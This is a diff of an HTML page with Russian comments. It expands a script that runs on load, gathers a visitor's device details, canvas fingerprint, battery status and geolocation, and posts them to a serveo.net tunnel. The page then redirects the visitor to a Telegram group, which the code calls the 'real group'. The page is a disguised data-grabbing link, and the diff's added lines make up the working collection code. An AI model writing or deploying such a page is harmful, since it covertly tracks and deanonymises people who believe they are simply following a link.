@@ -1,32 +1,77 @@
 <html>
 <body>
   <script>
-    // Отправка данных на сервер
-    fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
-      method: 'POST',
-      body: JSON.stringify({
-        userAgent: navigator.userAgent,
-        referrer: document.referrer,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        colorDepth: screen.colorDepth,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        cookieEnabled: navigator.cookieEnabled,
-        platform: navigator.platform,
-        onlineStatus: navigator.onLine,
-        currentURL: window.location.href
-      }),
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    });
+    // Функция для получения отпечатка Canvas
+    function getCanvasFingerprint() {
+      var canvas = document.createElement('canvas');
+      var ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Hello, world!', 2, 15);
+      return canvas.toDataURL();
+    }
 
-    // Редирект на реальную группу
-    setTimeout(function() {
-      window.location.href = 'https://t.me/unixgnutgk';
-    }, 100); // через 1 секунду
+    // Функция для получения данных о батарее
+    function getBatteryInfo() {
+      return navigator.getBattery().then(function(battery) {
+        return {
+          charging: battery.charging,
+          level: battery.level * 100 + '%',
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+      });
+    }
+
+    // Функция для отправки данных на сервер
+    function sendData(position, batteryInfo) {
+      fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
+        method: 'POST',
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          referrer: document.referrer,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          colorDepth: screen.colorDepth,
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          cookieEnabled: navigator.cookieEnabled,
+          platform: navigator.platform,
+          onlineStatus: navigator.onLine,
+          currentURL: window.location.href,
+          location: {
+            latitude: position ? position.coords.latitude : 'N/A',
+            longitude: position ? position.coords.longitude : 'N/A',
+            accuracy: position ? position.coords.accuracy : 'N/A'
+          },
+          battery: batteryInfo,
+          canvasFingerprint: getCanvasFingerprint()
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      });
+
+      // Редирект на реальную группу
+      setTimeout(function() {
+        window.location.href = 'https://t.me/unixgnutgk';
+      }, 100);
+    }
+
+    // Получение местоположения и информации о батарее
+    navigator.geolocation.getCurrentPosition(function(position) {
+      getBatteryInfo().then(function(batteryInfo) {
+        sendData(position, batteryInfo);
+      });
+    }, function(error) {
+      // Если геолокация не разрешена, отправляем только данные о батарее
+      getBatteryInfo().then(function(batteryInfo) {
+        sendData(null, batteryInfo);
+      });
+    });
   </script>
 </body>
 </html>
-
